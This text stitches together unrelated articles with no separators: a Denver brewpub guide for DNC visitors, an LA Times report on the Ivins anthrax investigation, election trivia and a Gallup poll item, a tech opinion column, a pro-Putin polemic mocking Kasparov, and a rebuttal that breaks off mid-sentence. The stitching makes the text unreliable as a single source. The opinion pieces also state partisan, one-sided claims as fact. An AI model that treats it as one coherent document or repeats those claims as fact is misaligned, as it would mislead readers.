First , if you want to sample as many beers as possible , we recommend you try Old Chicago and the Falling Rock Tap House .
Falling Rock , located at 1919 Blake ( just around the corner from Coors Field ) serves up a massive selection of American micros , including a couple dozen of Colorado ’s finest offerings .
Still thirsty ?
They have a lot more selections in bottles .
You may be familiar with Old Chicago already – the chain operates dozens of stores across the country .
You may not know that it started here – the first location was on the Pearl Street Mall in Boulder , and the Denver Market St. store , which DNC attendees will probably walk past several times a day , is one of the oldest and most established stores in the chain .
We recommend them for pizza ( more on that in an upcoming post ) , and it ’s also a great spot to sample brews .
They serve 110 beers , and at any given moment will have a wide selection of Colorado micros on tap and in bottles .
Rock Bottom is another national restaurant chain that started right here in Denver ( in fact , the Rock Bottom group owns Old Chicago and the ChopHouse as well as Walnut Brewing ) and store # 1 sits on the 16th St. Mall , not far from all the DNC activities .
If you visit Rock Bottom , we advise you to sample widely .
We ’ve never been terribly impressed with their regular run selection ( although the Molly ’s Titanic Brown is pretty good ) , but their rotating taps and seasonals are often outstanding .
And the food is just great – it ’s tasty and comes in big portions .
That ’s something to remember on those busy days where you may only have time to eat one meal .
If you ’re in Boulder , Walnut Brewing is pretty much a Rock Bottom .
Another place with good food , a mixed bag of regular run beers and great rotating taps and seasonals is Breckenridge Brewery , located at 2220 Blake Street .
The two beers that are always on tap ( I think ) worth checking out are the Avalanche Amber and the Pandora ’s Bock .
Avalanche is a typical amber of the sort that most places around here make , and the bock is fantastic – their best offering by far .
Also , sample the small batches and seasonals , because they may have something really special going on .
Denver ’s first brewpub was the Wynkoop Brewery , located at 18th and Wynkoop in LoDo .
( One of the founders was our mayor , John Hickenlooper , who was a major player in the development of the whole LoDo district .
I , for one , am a big J - Loop fan . )
Not only does Wynkoop produce some of the absolute best beers in town ( Railyard Ale is really popular , the Wixa Weiss is a great wheat , and the Quinn ’s Scottish hails from the “ robust and malty ” school of brewing that was so well known to my ancestors ) , it ’s also one of our best restaurants .
The menu features everything from upbeat pub dishes to more advanced culinary offerings , including game like elk , venison and buffalo .
The second floor , a massive billiards room , is one of the best social hangouts in town , too .
In sum , Wynkoop is where we usually take out of towners that we ’re looking to impress .
Another of our favorite places is Paramount Cafe , located a little further uptown at 519 16th St .
An especially good choice for sandwiches and burgers , Paramount serves the Big Nose collection of beers : Red , Brown and Wheat .
Unless things have changed they do n’t brew these themselves – they ’re commissioned from another Denver brewery – but the red , in particular , has always been one of my favorites .
Paramount also does a lot of live music , so it might be a great place to wind down after a day of hard politicking .
I mentioned the ChopHouse yesterday in the steak house review , and noted then that they ’re also a brewpup .
Like most brewpubs in town you ’re probably not going to love everything , but their across - the - board quality is unusually good for a place that produces a wide variety of micros .
If they ’re doing the bourbon stout ( no promises here – since it ’s summer they may be focusing on lighter varieties ) grab it .
CB & Pott ’s is a small sports bar / brew pub chain with locations all over the Denver Metro area , and if you ’re staying somewhere on the perimeter ( Tech Center , Broomfield , Westminster ) you may be near one of their stores .
It ’s an awesome place to catch a game , the food is good and the beers can be excellent ( they ’ve won medals at both the Great American Beer Festival and World Beer Cup ) .
The Big Red IPA and Buttface Amber are popular regular taps , and you should also inquire about seasonals and small batches .
Gordon Biersch is a national chain that you may already know about , and I mention it here because the Broomfield location serves up great ( if slightly overpriced ) food and the occasionally fabulous beer .
Their best offerings tend to be the seasonals , so ask for a taster .
Located in the Flatirons Mall .
Mountain Sun , Southern Sun and Vine St. Pub and Breweries : Mountain Sun is classic Boulder , and so is Southern Sun , its second Boulder location .
Tasty ( and appropriately healthy , since it ’s in Boulder ) sandwiches and lighter entrees and a variety of truly outstanding micros .
I have n’t been to their newest location – 17th and Vine in Denver – but if it ’s like the other two locations it ’s a major recommendation .
Mountain Sun is at 1535 Pearl St. in Boulder and Southern Sun is at 627 South Broadway .
Now , a couple of places that are hugely popular with us scrogues .
When we get together for socials , strategy meetings and whatnot , we tend to wind up either at Pint ’s Pub ( 221 West 13th Ave. , near Civic Center Park ) or the Bull & Bush ( 4700 Cherry Creek South Dr ) .
Both are modeled on English pubs and both take their hand - crafted beer seriously .
Pint ’s ( which we ’ll be talking about more when we get around to Scotch ) makes six varieties of ale , two of which are cask - conditioned “ real ales ” .
I tend to have my favorites in most places , but honestly , I like all six of these equally .
Bull & Bush is located a bit further way , but if you ’re looking for a relaxed atmosphere , good pub fare and great micros this is about as good a spot as you ’re going to find in Denver .
Ask about special tap and seasonal offerings , and taste it all .
Brews and Brands
If you ’re dining or recreating in a place that does n’t brew its own , you may wonder which of these brands you ’ve never heard of are worth trying .
As always , ask the bartender for advice , and be aware that most places will gladly serve you a taster to help you make up your mind .
That said , here are some of our favorites ( and we ’ve been sucking suds in this town since the early ’ 90s ) .
Flying Dog Brewing : Flying
Dog is pretty national these days , so you may already be familiar with their beers .
As they ’ve grown quality has suffered , sadly , but the wheat remains a solid choice and the Horn Dog Barley Wine is insanely good .
It ’s also insanely high gravity , so do n’t plan on driving .
They also have a new marsbier , Garde Dog , out this summer , and it ’s light ( high “ drinkability ” ) and flavorful – a really good choice for a hot evening , which we may be having while you ’re here .
New Belgium Brewing : Like Flying
Dog , they ’ve gotten big and have paid the price quality - wise .
However , 1554 Belgian Black remains a tasty darker option and the Sunshine Wheat – a wonderfully seasoned hefeweizen – remains one of the best brews of its kind in the state .
Avery Brewing : Located in Boulder , Avery has been a big favorite of the locals for a lot of years .
I personally think their small batch bottles ( you ’ll probably have to find your way to Argonaut Liquors on Colfax for one of these ) are their best beers , but their IPA , 14er ESB , Ellie ’s Brown , Out of Bounds Stout and Redpoint are all worthy .
Left Hand Brewing : Longmost - based Left Hand merged with ( or bought – I was never really sure ) Tabernash a few years back , and the combined operation has been a good one .
Their Sawtooth
Ale is a popular amber that ’s good year - round , but the two grand slams on the menu are the Milk Stout ( one of the state ’s very best darker micros ) and the Haystack Wheat ( which used to be the Tabernash Weiss ) , which along with the New Belgium mentioned above sits atop the pile for wheats in Colorado .
O’Dell ’s Brewing , based up the road in Ft. Collins , produces one of Colorado ’s favorite beers , 90 Shilling Ale .
This rich , austere amber will turn up on a lot of menus , and you ’ll also see their pales , wheats and darker varieties , as well .
A few years ago Oskar Blue ’s Brewing became the first US microbrewery to beginning canning its own beer , and the move has been successful enough that now even New Belgium has started migrated some of its beer to cans .
It ’s not all about the delivery method , though – their Dale ’s Pale and Old Chub are particularly good beers , having earned all kinds of acclaim from critics around the country .
Twisted Pine Brewing is an interesting case .
They ’ve won some prestigious medals and are ubiquitous in the Denver area , although I ’m not sure they ’re really accorded as much respect as they ’ve earned .
You ’ll see them on menus , and the award - winning Amber , Brown , Stout and Red are recommended .
If you ’re in Boulder , you can stop by the Tap Room at 3201 Walnut St .
It ’s going to be hard to try all of these fine establishments and micro varieties in just four or five days , but we hope you ’ll like what you do have time for .
The craft brew movement has been a wonderful thing for our culture because this is America ’s true beer heritage .
Not large corporations cranking out homogeneous lagers , but locals making beer in small batches , by hand , and selling to those in their own communities .
This is as authentic as it gets .
Enjoy .
Federal investigators cinched their case against alleged anthrax mailer Bruce E. Ivins after sophisticated genetic tests by a California firm helped them trace a signature mixture of anthrax spores , the Los Angeles Times has learned .
Well before the deadly 2001 anthrax mailings , Ivins , through his work as a government scientist , had combined anthrax spores obtained from at least one outside laboratory , people familiar with the evidence said .
With the help of leading outside geneticists and a fresh look at the evidence by a new team of street - savvy investigators , the FBI concluded in recent months that only Ivins could reasonably have perpetrated the crimes .
Ivins , 62 , a senior microbiologist at the government ’s elite biodefense research institute at Ft. Detrick , Md. , died last Tuesday in an apparent suicide as federal prosecutors prepared to bring murder charges against him .

Records reviewed by The Times and interviews with people knowledgeable about the investigation provide new details about the trail of evidence that finally led to Ivins .
Since 1980 , Ivins had specialized in developing vaccines against anthrax and other biological weapons .
He experimented with animals , including monkeys , rabbits and guinea pigs .
Ivins had mixed spores shipped to Ft. Detrick from the Army ’s Dugway Proving Ground in Utah , a facility operated by the Battelle Memorial Institute in Ohio , a private contractor that performs top- secret work for the CIA and other agencies .
By cross-referencing the dates when those spores were received and handled at Ft. Detrick , the FBI sharply narrowed the list of government employees with possible access to the material .

Instead of trying to trace anthrax that could have come from perhaps dozens of sources , investigators became convinced that it had to have originated at the U.S. Army Medical Research Institute of Infectious Diseases , or USAMRIID , located within Ft. Detrick , about 50 miles north of Washington .
“ Now , all of a sudden , you can put a time frame on this material , ” said one of the people familiar with the evidence .
“ By mixing the material from the separate institutions , [ Ivins ] provided what became a signature . ”
With new analyses showing that the admixture of anthrax could not have come from anywhere in the world but Ft. Detrick , FBI agents plunged deep into Ivins ’ history .
That history included a pattern of letter - writing to newspapers .
In one he defended the safety of research conducted on anthrax at Ft. Detrick .

“ The only way I can think of being seriously injured by anthrax or plague vaccine is to get plunked on the head by a vial of the stuff , ” Ivins wrote in a letter published April 12 , 1997 , in the Frederick ( Md. ) News - Post .
Immediately after the 2001 mailings , the FBI had turned to Ivins and his Ft. Detrick colleagues to help them with initial analyses of the anthrax evidence recovered in their investigation .
As the investigation ground on , authorities enlisted colleagues of J. Craig Venter , founder of a Rockville , Md. , institute that had helped map the human genome .
Based on analyses performed at the Institute for Genomic Research , Venter said the culprit “ almost had to be a government scientist . ”
The institute ’s analysis was completed under contract to the FBI and the National Institute of Allergy and Infectious Diseases .
Venter said federal investigators within the last two years retrieved the anthrax evidence from the institute .

“ FBI came in and took freezers and all the samples , ” he said in an interview Sunday .
Ibis Biosciences , a company in Carlsbad , performed some of the most recent anthrax analysis .
The company tells its clients , including the FBI , that its high - resolution anthrax genotyping kit provides analyses more advanced than any other technology worldwide .
In fact , the company ’s test results buoyed FBI and Justice Department officials .
“ Their capability is very sophisticated ; it is faster and more elegant than what had been available , ” said Randall S. Murch , a former FBI scientist who earlier served as an outside consultant to the bureau for the anthrax investigation .

Ibis provided its services to the anthrax investigation under a nondisclosure agreement with the FBI that bars company personnel from discussing their work without government authorization .
Ivins ’ government work with the separate batches of dry powder anthrax was not widely known at USAMRIID .
Two former top officials there told The Times in recent weeks that they had no idea until being contacted by a reporter that USAMRIID had received anthrax in either powder or wet form from Dugway or Battelle , whose own anthrax testing is done in Ohio .
The former officials noted that USAMRIID typically supplies live anthrax spores for use at the two outside facilities , not the other way around .
As part of his government job , Ivins , a microbiologist , grew spores used for experiments , called “ challenges , ” on monkeys , rabbits and other animals at USAMRIID .
He also occasionally prepared spores , in liquid or frozen form , for shipment to Dugway and Battelle .
The forensic analysis of the anthrax sent in the mailings had long posed a challenge to the FBI , whose in - house scientists were not equipped to decipher the potential origin of the material .
Some of the first analysis was performed by Ivins and other scientists at USAMRIID ; such efforts also were attempted at Battelle , but technicians there rendered some of the material forensically useless by first sterilizing it with steam , scientists told The Times .
A spokesman for Battelle , T.R. Massey , declined earlier this year to discuss Battelle ’s role .

Six years ago , Ivins acknowledged to an Army investigator his use of “ Ames strain ” anthrax spores obtained from Dugway .
“ We currently use Ames spores prepared at Dugway Proving Ground in 1997 for our challenges , ” Ivins told the investigator on May 10 , 2002 , as part of the Army ’s investigation of his failure to report what he described as accidental spillages of anthrax spores near or within his office and other nonlaboratory areas at USAMRIID .
After he bleached those areas , in December 2001 , Ivins kept it a secret for five months , according to what he told the Army .
It also was in December 2001 that FBI agents began questioning potential suspects at Ft. Detrick , a development that former colleagues say may have driven Ivins to panic regarding whether powder from the mailings could be traced to him .
When he acknowledged his stealth bleaching to the Army in April 2002 , Ivins said that he had not wanted to “ cry wolf ” and distract his colleagues , who along with him were helping the FBI to analyze anthrax powder and other materials being gathered in the criminal investigation .

Until federal officials make public the details of the evidence that they say establishes Ivins ’ guilt , some former colleagues and outside skeptics say they will not be persuaded .
“ The scientific community seems to be concerned that the FBI is going to blow smoke at us , ” said David R. Franz , a former Army commander who led USAMRIID during part of Ivins ’ tenure , in the late 1990s .
The FBI Sunday refused to comment on how it had focused on Ivins .
“ As soon as the legal constraints barring disclosure are removed , we will make public as much information as possible , ” said FBI Assistant Director John Miller .
“ We will do that at one time , in one place .
We will do that after those who were injured and the families of those who died are briefed , which is only appropriate . ”

Times researcher Janet Lundblad contributed to this report .
Undeterred by the much - discussed John McCain ad that depicted Barack Obama as little more than an example -- along with Paris Hilton and Britney Spears -- of a celebrity - drenched culture , the presumptive Democratic presidential nominee is celebrating his special day tonight at a gala fundraiser in Boston where Harry Connick Jr. ( below ) will croon " Happy Birthday " to him ( a better choice than a latter - day Marilyn Monroe , we 'll give his campaign credit for that ) .
Obama turned 47 today ; later this month ( on the Aug. 29 ) , McCain will be 72 .
Ever since McCain locked down the Republican presidential nomination , it has been frequently noted that if he triumphs in November , he will be the older than any other president elected to a first term .
Less notice has been paid to another of this campaign 's precedent - setting aspects : the largest age difference ever -- 24 years , 11 months and 6 days -- between the two leading White House candidates .
Oddly , what for more than a century had been the biggest gap in ages between candidates -- the 21 years , 8 months and 29 days that separated Democrat James Buchanan ( who was the older one ) and Republican John Fremont in the 1856 election -- has been shattered twice before in recent cycles .
Bill Clinton was giving away 22 years , 2 months and 7 days to President George H.W. Bush when they squared off in 1992 .
Four years later , the gap between Clinton and Republican Bob Dole was 23 years , 28 days -- the record that the Obama / McCain contest is surpassing .
One other bit of trivia :
The shared August birthdays of Obama and McCain mean that when one of them takes office on Jan. 20 , the month will tie November for second place -- with five -- in the producing - presidents department .
The other August babies who grew up to become commander in chief were Benjamin Harrison , Herbert Hoover , Lyndon Johnson and Clinton .
The month during which the largest number of presidents have been born ?
October , with six .

PRINCETON , NJ -- Gallup Poll Daily tracking suggests that if the presidential election were held today , registered voters would choose Barack Obama over John McCain by a five percentage point margin , 47 % to 42 % .
These results , based on June 15 - 17 interviewing , suggest that voter preferences are fairly stable at the moment -- Obama 's lead has been four or five points in each of the last three individual nights of polling .
Obama has averaged a four percentage point advantage over McCain since Hillary Clinton decided to suspend her campaign , though in the immediate days after Clinton conceded the nomination Obama led by as much as seven points .
McCain has trailed Obama for most of June and last held a significant lead over him in May 21 - 25 polling .

Women in Tech : 20 Trailblazers Share Their Journeys
Successful women in the tech trenches share their insights and tackle subjects ranging from how to search out a strong mentor to how to be one -- from how to advance in a large company to how to start your own firm .
Get the Kindle or Paperback .
Sometimes it 's the little things that can cause you to step back and rethink how you look at a company .
For much of this decade Microsoft has been the " evil empire " with Apple , Linux and Google on the side of the Force ( sorry for the " Star Wars " metaphor ) .
With Microsoft actually doing some positive creative things for once , Apple 's decision to raise iPhone prices in the face of declining consumer income , Google 's attack on single parents , and Richard Stallman 's attack on Bill Gates ' philanthropy ( which follows an earlier anti-U.S. positions ) , it appears these entities ' images may be changing .
Let 's chat about these things this week and close with my product of the week , Microsoft Equipt , which is the first desktop bundle since the original Microsoft Office that potentially could change the entire market and the broad perception of Microsoft .
The Fall of Google
My general sense when I looked at both the age of Google 's leaders and the way Google was structured was that Google 's biggest short - term exposure was not competition but entitlements .
Like many dot-coms , they seemed to go a bit overboard and without the experience as to how to manage these entitlements were likely going to get in a lot of trouble when economic conditions forced them to cut back .
Well , that may have just happened .
Apparently , one of the first cutbacks was on day care , increasing prices to employee parents using this program from US $ 1,425 to a whopping $ 2,500 per child per month .
Parents with two kids saw their annual expense jump from $ 33,000 to nearly $ 60,000 .
With reported comments from Google 's executive staff that reminded me of the " let them eat cake " comment that supposedly helped start the French Revolution ( the woman this comment was attributed to , Marie Antionette , was guillotined to death ) you have to wonder what the folks at Google were thinking .
If you search on Google on the words " Day Care and Google " you 'll see this thing has hit a global nerve with words like " Mutiny " and " Discontent " common .
At a time when the executive staff seems to be flitting around in the company 767 " party plane " and prices for everyone are growing out of control thanks to gas increases ; hitting parents , many of them single parents , with something like this really caused a lot of people to look at the company differently .
I do n't know what your definition of " evil " is , but to me , going after parents and kids during hard times while vacationing in a company - paid flying palace would be more evil than anything I can recall Microsoft ever doing to its employees .
I 'd suggest they get rid of the plane if they really need to save costs before they attack their employees ' kids .
I think this forms the basis of a Google decline and the first big step down that path .
The Changing Face of Apple and Linux
In many ways , both of these entities have benefited by being anti-Microsoft .
I can't argue that this has mostly been Microsoft 's own fault but it becomes risky for anyone to depend on the other guy screwing up as they typically do n't forever .
For Apple , I think the strategy of colluding with AT&T to increase prices for the new iPhone , bring out an incomplete product , while reducing the cost of the phone to Apple during a time when consumers are in financial distress is a bad one .
While I 'd often agree with Steve Jobs that most consumers , including me , do n't do as much homework as they should when making a purchase , taking advantage of them during hard times is n't wise .
It could cause many who are n't dyed - in - the - wool Apple fans to look at the firm differently .
I mentioned this last week when I said it was " OK to Say No to the New iPhone . "
Add this to the reports that Apple charges customers 200 percent more than Dell for similar upgrades to Macs , and recall that taking advantage of customers who were locked in was a large part of what caused IBM to fall in the ' 80s .
People under financial pressure just do n't respond kindly to any vendor taking advantage of them .
For Linux , Microsoft 's strategy of embracing and interoperating with the platform has created an interesting conundrum .
IT managers really like this strategy and generally operate mixed environments .
They really have no problem with any vendor who is n't misbehaving and is providing good value .
In short , peace has broken out -- but for a product that was marketed as a weapon in the war against Microsoft , peace is a poison .
However , to fuel a war , Microsoft has to play , and generally Microsoft does n't want to .
To fix this , Richard Stallman just went after the Bill and Melinda Gates Foundation , challenging its work and taking shots at Apple and Adobe in the process .
Going after a founder might upset Microsoft , but this has got to be one of the stupidest things I 've ever seen anyone who wants to help their cause actually do -- well , maybe number two .
Recall he had previously shown up in Cuba apparently positioning Linux as a weapon against the West , which was equally unwise .
What 's next ?
Helping Iran ?
Oh wait , he did that too .
Have to admit the guy is on a roll .
Apple and Linux , at least Richard Stallman 's Linux ( fortunately he speaks for the minority ) , seem to be drifting from White Hat players to Black , and this bears watching .
Product of the Week : Microsoft Equipt
One of the big problems any company that reaches a high level of dominance has is growing profit .
Unfortunately , both the most foolish and the easiest path to do this is to allow their products to become more expensive than the value of that product to the buyer .
This , I believe , goes to the core of the problem with both Windows Vista and Microsoft Office .
It is a suicidal , at least long term , misuse of power , and I 've seen a number of companies do this -- the first being IBM , and the most recent being Apple .
The only company I 've seen put in place a formal process to prevent this mistake is EMC , and I think every firm should do this .
Microsoft Equipt actually provides more value than it costs and may be the perfect accessory that makes Vista , for most of us , work .
I 'm a big believer in subscription pricing because it gets vendors off the path of having to break aging products to get you to buy new ones while placing emphasis on assuring reliability and ease of use ( customers do n't renew subscriptions for things they no longer value ) .
A subscription model also focuses companies more on services than core technology creating a better balance between features that only developers love and experiences that consumers ' need .
Finally , a subscription ties the vendor and the consumer into a long - term relationship , which tends to both improve information going to the vendor and makes them more responsive to the consumer .
The product itself bundles Microsoft Office Home and Student ( all most people really need ) , Windows Live OneCare ( security , performance , help ) , Office Live Workspace ( collaboration ) , and Windows Live Services ( communications ) under a $ 70 annual fee for up to 3 machines .
That 's under $ 6 a month for 3 machines or under $ 2 per machine per month .
Hard to argue that is n't a good value .
I think Equipt will help change how people perceive Microsoft and it is a huge step in the right direction for the company .
As such , it floats to the top as my product of the week and has a good shot at being my product for the year .

On Sunday , Putin 's party , United Russia , stormed to victory in the country 's parliamentary elections with 63 per cent of the vote .
It was a romp .
United Russia now controls 306 of the 450 seats in the Duma , an overwhelming majority .
The balloting was a referendum on Putin 's leadership and it passed in a landslide .
Now it 's certain , that even if Putin steps down as president next year as expected , he will be the dominant player in Russian politics for the foreseeable future .
Vladamir Putin is arguably the most popular leader in Russian history , although you 'd never know it by reading the western media .
According to a recent survey conducted by the Wall Street Journal , Putin 's personal approval rating in November 2007 was 85 per cent , making him the most popular head of state in the world today .
Putin 's popularity derives from many factors .
He is personally clever and charismatic .
He is fiercely nationalistic and has worked tirelessly to improve the lives of ordinary Russians and restore the country to its former greatness .
He has raised over 20 million Russians out of grinding poverty , improved education , health care and the pension system , ( partially ) nationalized critical industries , lowered unemployment , increased manufacturing and exports , invigorated Russian markets , strengthened the ruble , raised the overall standard of living , reduced government corruption , jailed or exiled the venal oligarchs , and amassed capital reserves of $ 450 billion .
Russia is no longer up for grabs like it was after the fall of the Soviet Union .
Putin put an end to all of that .
He reasserted control over the country 's vast resources and he 's using them to improve the lives of his own people .
This is a real departure from the 1990s , when the drunken Yeltsin steered Russia into economic disaster by following Washington 's neoliberal edicts and by selling Russia 's Crown Jewels to the vulturous oligarchs .
Putin put Russia 's house back in order ; stabilized the ruble , strengthened economic / military alliances in the region , and removed the corporate gangsters who had stolen Russia 's national assets for pennies on the dollar .
The oligarchs are now all either in jail or have fled the country .
Russia is no longer for sale .
Russia is , once again , a major world power and a vital source of hydrocarbons .
It 's star is steadily rising just as America 's has begun to wane .
This may explain why Putin is loathed by the West .
Freud might call it petroleum envy , but it 's deeper than that .
Putin has charted a course for social change that conflicts with basic tenets of neoliberalism , which are the principles which govern US foreign policy .
He is not a member of the corporate - banking brotherhood which believes the wealth of the world should be divided among themselves regardless of the suffering or destruction it may cause .
Putin 's primary focus is Russia ; Russia 's welfare , Russia 's sovereignty and Russia 's place in the world .
He is not a globalist .
That is why the Bush administration has encircled Russia with military bases , toppled neighboring regimes with its color - coded revolutions , ( which were organized by US NGOs and intelligence services ) intervened in Russian elections , and threatened to deploy an ( allegedly defensive ) nuclear weapons system in Eastern Europe .
Russia is seen as a potential rival to US imperial ambitions and must be contained or subverted .
In the early years of his presidency , it was believed that Putin would comply with western demands and accept a subordinate role in the US - EU - Israel centric system .
But that has n't happened .
Putin has stubbornly defended Russian independence and resisted integration into the prevailing system . .
The triumphalism which swept through Washington after the fall of the Berlin Wall has been replaced with a palpable fear that Russia 's power will grow as oil prices continue to soar .
The tectonic plates of geopolitical power are gradually shifting eastward .
That 's why the US has joined in The Great Game and is trying to put down roots in Eurasia .
Still , it 's easy to imagine a scenario in which America 's access to the last great oil and natural gas reserves on the planet -- the three trillion barrels of oil and natural gas located in the Caspian Basin --- could be completely blocked by a resurgent Russian superpower .
The most powerful of the Washington think tanks , the Council on Foreign Relations , recognized this problem early on and decided that US policy towards Russia had to be reworked entirely .
* * * John Edwards and Jack Kemp were appointed to lead a CFR task force which concocted the pretext for an all - out assault on the Putin .
This is where the idea that Putin is " rolling back democracy " began .
In their article " Russia 's Wrong Direction " , Edwards and Kemp state that a " strategic partnership " with Russia is no longer possible .
They claim that the government has become increasingly authoritarian and that the society is growing less " open and pluralistic " .
Kemp and Edwards provided the ideological foundation upon which the entire public relations campaign against Putin has been built .
And it is quite an impressive campaign .
A Google News search shows roughly 1,400 articles from the various news services on Putin .
Virtually all of them contain exactly the same rhetoric , the same buzzwords , the same spurious claims , the same slanders .
It is impossible to find even one article out of 1,400 that diverges the slightest bit from the talking points which originated at the Council on foreign Relations .
It 's interesting to see to what extent the media has become a propaganda bullhorn for the national security state .
Putin 's personal approval ratings confirm his enormous popularity , and yet , the media continues to treat him like he 's a tyrant .
It is utterly incongruous .
In most articles , Putin is disparaged as " anti democratic " ; a charge that is never leveled at the Saudi Royal family even though women are forbidden to drive , they must be fully - covered at all times , and can be stoned to death if they are found to be unfaithful .
Also , in Saudi Arabia , beheading is still the punishment of choice for capital crimes .
When Saudi King Abdullah visits the US , he is not heaped with scorn for his regimes ' repressive treatment of his people .
Instead he 's rewarded with flattering photos of he and George Bush strolling arm - n- arm through the Crawford sage .
Why is Putin blasted for " rolling back democracy " when American client , Mikhail Saakashvili , arbitrarily declares martial law and deploys his truncheon - wielding Robo - cops to beat protesters senseless before dragging them off to the Georgia gulag ?
The pictures of Saakashvili 's bloody crackdown appeared in the foreign press , but not in the US .
Rather , the media had all its cameras focused on Garry Kasparov ( contributing editor to the Wall Street Journal and right - wing loony ) as he was led off to the Moscow hoosegow in handcuffs for protesting without a permit .
* * * Putin's real crime is that he serves Russia 's national interests rather than the interests of global Capital .
He also rejects Washington 's " unipolar " world model .
As he said in Munich : " The unipolar world refers to a world in which there is one master , one sovereign ; one center of authority , one center of force , one center of decision - making .
At the end of the day this is pernicious not only for all those within this system , but also for the sovereign itself because it destroys itself from within .
" What is even more important is that the model itself is flawed because at its basis there is and can be no moral foundations for modern civilization . "
He added : " We are seeing a greater and greater disdain for the basic principles of international law ....
We are witnessing an almost uncontained hyper use of force -- military force -- in international relations , force that is plunging the world into an abyss of permanent conflicts .
I am convinced that we have reached that decisive moment when we must seriously think about the architecture of global security . "
Well said , Vladimir .
Putin's no saint , but he does n't deserve the thrashing he gets from the western media .
And a final word on Garry Kasparov On Sunday , while Putin 's party " United Russia " was screeching to a landslide victory , Reuters News was busy taking mug -shots of the stony - faced Kasparov holding up Florida - style ballots claiming the voting was rigged .
" They are not just rigging the vote , " Kasparov moaned , " They are raping the whole electoral system .
These elections are a reminder of Soviet elections when there was no choice ..... Putin is going to have a hard time trying to rule like Stalin . "
Stalin ?
So now Putin is Stalin ?
First of all , when did Reuters begin to take such a keen interest in voting irregularities ?
It must be a recent development , becuase they were nowhere to be found in the 2000 presidential election .
And when did they start to pay attention to " political dissent " ?
They certainly never wasted any video - footage on the antiwar rallies in the US .
Are we to believe that they are more interested in democracy in Russia than America ?
And why is Reuters so eager to provide valuable column - space to a washed - up chessmaster who 's only interested in making a nuisance of himself by bellyaching about voter fraud ?
That 's not news ; it 's propaganda .
As for Kasparov and his silly accusations ; he should be glad that he lives in Putin 's Russia rather than Stalin 's or he'd be in leg - irons right now boarding a northbound train to the Siberian outback .
What is Kasparov doing in Moscow anyway ?
And why is this little man -- with virtually no political base -- such a big part of the western media narrative ?
Is he only there to discredit the election and throw a little more muck on Putin or is there more to it than that ?
Garry Kasparov should give up politics and do what he does best ; stand - up comedy .
Watching Kasparov traipse around Moscow with his basket of sour grapes and his entourage of western media - stooges is like watching " Mr. Bean 's Excellent Kremlin Adventure " , a particularly lame performance in a dismal B - rated burlesque .
It 's painful to watch .
Kasparov 's party , the " Other Russia " could n't manage even a 2 per cent rating in the polls .
The party is a complete dud .
In fact , Reuters even ( reluctantly ) admits as much in its article .
Here 's the clip .
Reuters : " Kasparov and his " Other Russia " dissident movement are not standing in Sunday 's parliamentary election because they could not get registered as a party .
THEY ENJOY LITTLE PUBLIC SUPPORT AMONG RUSSIANS BUT HAVE A BIG FOLLOWING IN THE WEST . " ( Reuters ) " Big following in the West " ?
Why does n't that surprise me ?
So , in other words , Kasparov has no base of support in Russia , and yet he gets his own camera crew and media team to follow him around recording every silly he says .
That 's just great .
Who do they think he is ; Nelson Mandela ?
Kasparov is a contributing editor of Murdoch 's Wall Street Journal ; so he already has a regular platform for launching his tirades on the " tyrannical " Mr. Putin .
Normally , one does n't get a spot on the op - ed page of the WSJ unless their politics are somewhere to the right of Augusto Pinochet .
That 's probably the case with Kasparov , too .
In Saturday 's edition of the WSJ , Kasparov delivered his latest absurd soliloquy disparaging Putin and recounting his agonizing 5 day ordeal in the Moscow poky .
Although Kasparov has garnered little public support in Russia , he appears to have a loyal following among the Washington elite .
According to Wikipedia : " In 1991 , Kasparov received the Keeper of the Flame award from the Center for Security Policy ( a US think tank ) , for anti-Communist resistance and the propagation of democracy .
Kasparov was an exceptional recipient since the award is given to " individuals for devoting their public careers to the defense of the United States and American values around the world " .
Hmmmm .... " For devoting their public careers to the defense of the United States and American values around the world " ?
Is n't that a definition of an American agent ?
Again , according to Wikipedia :
In April , 2007 it was asserted that Kasparov was a board member of the National Security Advisory Council of the Center for Security Policy , a non-profit , non-partisan national security organization that specializes in identifying policies , actions , and resource needs that are vital to American security " .
Kasparov confirmed this and added that he was removed shortly after he became aware of it .
He noted that HE DIDN'T KNOW ABOUT THE MEMBERSHIP and suggested he was included in the board by an accident because he received the 1991 Keeper of the Flame award from this organization .
But Kasparov maintained his association with the neoconservative leadership by giving speeches at think tanks such as the Hoover Institute . "
Here 's a list of some of the other fellow travelers who 've been given the " Keeper of the Flame Award " : 2007 - Senator Joe Lieberman .
2004 - General Peter Pace .
2003 - Paul Wolfowitz .
2002 - General Richard Meyers .
1998 - Donald Rumsfeld .
1996 - Newt Gingrich .
1995 - Ronald Reagan .
1990 - Casper Weinberger .
Is Kasparov an anomaly or does he fit right in with this coven of far - right loonies ?
And who are some of the prominent members of the Center for Security Policy ?
Richard Perle , Douglas Feith , Frank Gaffney , James Roche and Laura Ingraham .
Oh , boy .
The whole front office of the neocon 's cuckoo 's nest .
Now tell me , dear reader , with friends like that ; what should we really think about Kasparov 's performance in Moscow ?
Is he really interested in " democracy promotion " as he claims or is their acting out a script that was prepared in Washington ?
In the US , Kasparov has become the focal point of the Russian elections - the primary source of " unbiased " analysis .
NPR reiterates his spurious claims every half hour .
The other news agencies are no better .
He has become the distorted lens through which Americans view Russian democracy .
This says a lot more about the choke - hold the neocons still have on the media rather than anything objective about Russia .
The Kasparov fiasco gives us a chance to see the inner-workings of the establishment media .
It 's nothing more than a propaganda bullhorn for far - right organizations executing their bloody imperial strategy .
Fidel Castro summed it up best just days ago when he said : " It is the most sophisticated media ever developed by technology , employed to kill human beings and to subjugate or exterminate peoples " .
Amen to that , Fidel .

Commentary Russian Elections And The Remaining Oligarchs By Israel Shamir 12 -9 - 7
Mike
Whitney is an inspired writer we usually agree with and share his admiration of Russia 's progress .
Recently , he enthused over election victory of Putin 's party in Russia 's parliamentary elections .
He is right up to a point .
Indeed , the Council of Foreign Relations , the leading think tank of the American establishment , hates Putin because he does not submit to Washington 's will .
Indeed , Putin is popular , and he did many good things for the Russian people .
Indeed , the liberal opposition led by Kasparov , Kasyanov et al is tiny and much disliked .
Still , our readers deserve a better assessment , not a Disney - style Tom and Jerry comics .
Propaganda is useful to mobilise soldiers , but it interferes with generals ' judgment .
Let us begin with something simple .
Mike writes : " Putin removed the corporate gangsters who had stolen Russia 's national assets the oligarchs are now all either in jail or have fled the country . "
It would be a great achievement , if it were happening .
While two oligarchs , Berezovsky and Gusinsky , indeed fled Russia in very early days of Putin 's rule , and one , Khodorkovsky , who tried to unseat Putin by using his wealth , is in jail and his acolytes are in running , the oligarchs ' demise is rather overstated .
From Norilsk
